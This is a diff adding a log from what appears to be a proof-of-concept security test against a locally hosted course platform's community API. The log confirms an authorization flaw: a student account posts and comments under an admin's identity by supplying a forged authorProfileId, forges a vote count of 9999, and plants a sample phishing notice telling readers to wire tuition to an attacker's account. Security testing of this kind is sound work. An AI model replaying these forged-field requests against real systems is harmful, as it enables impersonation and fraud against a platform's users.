@@ -1,0 +1,24 @@
+========================================================================
+VULN-002: Community BOLA — post/comment as any user + forged votes
+target: API=http://localhost:21527  dashboard=http://localhost:21526
+========================================================================
+[INFO] route apps/api/src/routes/community/community.ts:70-88 (orgMemberMiddleware only)
+[INFO] service community.ts:102-145 inserts body authorProfileId/organizationId/slug verbatim
+[SETUP] admin login (the impersonation VICTIM)
+[SETUP] victim ADMIN profile id = 0419cf7a-0f8b-4797-b953-e8747cc41939
+[SETUP] provision a low-privilege STUDENT (self-register + accept course share link)
+[SETUP] attacker STUDENT profile id = 5c65a30d-dcc1-4ec8-a9e8-95aaf393eabe role_in_org=3 (3=STUDENT)
+[STEP] as STUDENT 5c65a30d-dcc1-4ec8-a9e8-95aaf393eabe: POST /community authorProfileId=0419cf7a-0f8b-4797-b953-e8747cc41939 (the ADMIN) slug=notice_8244f674
+[INFO]   response: HTTP 201 {"success":true,"data":{"id":8,"title":"OFFICIAL: mandatory payment portal","body":"Wire tuition to attacker-controlled account. marker=body_d6d2d5ea","votes":0,"createdAt":"2026-09-27 14:49:05.123461+00","courseId":"eed
+[INFO]   created question id=8 authorId(returned)=None
+[PROOF] DB community_question.author_profile_id = 0419cf7a-0f8b-4797-b953-e8747cc41939  (attacker session was 5c65a30d-dcc1-4ec8-a9e8-95aaf393eabe)
+[INFO] DB community_question.votes = 0  (question insert hardcodes 0 — see query :199-221)
+[PROOF] GET /community/notice_8244f674 shows authorId=0419cf7a-0f8b-4797-b953-e8747cc41939 authorFullname='admin'
+[STEP] as STUDENT: POST /community/8/comment authorProfileId=0419cf7a-0f8b-4797-b953-e8747cc41939 votes=9999
+[INFO]   response: HTTP 201 {"success":true,"data":{"id":"eeda431e-cfa3-4b5a-8eb9-2d351518b20a","body":"Forged endorsement by admin marker=body_d6d2d5ea","votes":9999,"createdAt":"2026-09-27 14:49:05.23496+00","authorId":"0419cf
+[PROOF] comment returned author=0419cf7a-0f8b-4797-b953-e8747cc41939 votes=9999; DB(author|votes)=0419cf7a-0f8b-4797-b953-e8747cc41939|9999
+[INFO] cleanup: archived 1 test-student seat(s) created this run
+[PROOF] STUDENT 5c65a30d-dcc1-4ec8-a9e8-95aaf393eabe published a community post attributed to ADMIN 0419cf7a-0f8b-4797-b953-e8747cc41939 (DB + API read-back agree) — author spoofing / BOLA confirmed
+[PROOF] and a comment attributed to the ADMIN with a forged vote count of 9999 (mass-assignment)
+==> VULN-002: CONFIRMED — STUDENT posts community content as the ADMIN (forged authorProfileId); comment votes also forged
+[OK] exploit confirmed — impersonation + mass-assignment on the community write path
